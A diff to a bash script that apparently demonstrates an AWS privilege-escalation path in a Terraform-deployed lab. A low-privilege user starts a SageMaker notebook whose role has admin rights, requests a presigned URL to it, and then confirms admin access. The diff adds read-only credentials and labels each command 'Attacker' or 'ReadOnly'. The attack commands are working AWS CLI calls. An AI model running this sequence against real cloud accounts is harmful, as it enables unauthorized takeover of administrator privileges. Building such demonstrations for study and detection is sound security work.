@@ -25,12 +25,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -65,6 +67,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -75,6 +86,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Target notebook: $NOTEBOOK_NAME"
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
@@ -82,17 +94,27 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -102,17 +124,19 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -120,15 +144,16 @@ else
 fi
 echo ""
 
-# Step 5: Discover and describe target notebook
+# [OBSERVATION] Step 5: Discover and describe target notebook
 echo -e "${YELLOW}Step 5: Discovering target SageMaker notebook instance${NC}"
+use_readonly_creds
 echo "Listing notebook instances..."
-show_cmd aws sagemaker list-notebook-instances --region $AWS_REGION --output table
+show_cmd "ReadOnly" "aws sagemaker list-notebook-instances --region $AWS_REGION --output table"
 aws sagemaker list-notebook-instances --region $AWS_REGION --output table
 
 echo ""
 echo "Describing target notebook: $NOTEBOOK_NAME"
-show_cmd aws sagemaker describe-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION --output json
+show_cmd "ReadOnly" "aws sagemaker describe-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION --output json"
 NOTEBOOK_INFO=$(aws sagemaker describe-notebook-instance \
     --notebook-instance-name $NOTEBOOK_NAME \
     --region $AWS_REGION \
@@ -142,7 +167,7 @@ echo "Notebook execution role: $NOTEBOOK_ROLE"
 echo ""
 
 echo "Verifying the notebook's execution role has admin permissions..."
-show_cmd aws iam get-role --role-name $NOTEBOOK_ROLE_NAME --query "Role.{RoleName:RoleName,Arn:Arn}" --output table
+show_cmd "ReadOnly" "aws iam get-role --role-name $NOTEBOOK_ROLE_NAME --query \"Role.{RoleName:RoleName,Arn:Arn}\" --output table"
 aws iam get-role --role-name $NOTEBOOK_ROLE_NAME --query 'Role.{RoleName:RoleName,Arn:Arn}' --output table
 echo ""
 # echo "Checking attached policies..."
@@ -150,8 +175,9 @@ echo ""
 
 echo -e "${GREEN}✓ Target notebook found with admin execution role${NC}\n"
 
-# Step 6: Wait for notebook to be InService if not already
+# [EXPLOIT] Step 6: Wait for notebook to be InService if not already
 echo -e "${YELLOW}Step 6: Ensuring notebook is in InService state${NC}"
+use_starting_creds
 echo "Current status: $NOTEBOOK_STATUS"
 
 # If notebook is not InService, wait for it
@@ -161,6 +187,7 @@ if [ "$NOTEBOOK_STATUS" != "InService" ]; then
     # If stopped, start it
     if [ "$NOTEBOOK_STATUS" == "Stopped" ]; then
         echo "Starting notebook instance: $NOTEBOOK_NAME"
+        show_attack_cmd "Attacker" "aws sagemaker start-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION"
         aws sagemaker start-notebook-instance \
             --notebook-instance-name $NOTEBOOK_NAME \
             --region $AWS_REGION
@@ -171,6 +198,7 @@ if [ "$NOTEBOOK_STATUS" != "InService" ]; then
     MAX_WAIT=600  # 10 minutes
     ELAPSED=0
     while [ $ELAPSED -lt $MAX_WAIT ]; do
+        use_readonly_creds
         CURRENT_STATUS=$(aws sagemaker describe-notebook-instance \
             --notebook-instance-name $NOTEBOOK_NAME \
             --region $AWS_REGION \
@@ -202,12 +230,13 @@ else
     echo -e "${GREEN}✓ Notebook is ready${NC}\n"
 fi
 
-# Step 7: Generate presigned URL
+# [EXPLOIT] Step 7: Generate presigned URL
 echo -e "${YELLOW}Step 7: Generating presigned URL for notebook access${NC}"
+use_starting_creds
 echo "Creating presigned URL for notebook: $NOTEBOOK_NAME"
 echo ""
 
-show_attack_cmd aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION --query 'AuthorizedUrl' --output text
+show_attack_cmd "Attacker" "aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION --query 'AuthorizedUrl' --output text"
 PRESIGNED_URL=$(aws sagemaker create-presigned-notebook-instance-url \
     --notebook-instance-name $NOTEBOOK_NAME \
     --region $AWS_REGION \
@@ -248,12 +277,13 @@ echo "Waiting 15 seconds for IAM policy propagation..."
 sleep 15
 echo -e "${GREEN}✓ Policy changes should now be effective${NC}\n"
 
-# Step 10: Verify administrator access
+# [OBSERVATION] Step 10: Verify administrator access
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
+use_readonly_creds
 echo "Testing if we now have admin permissions..."
 echo "Attempting to list IAM users..."
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
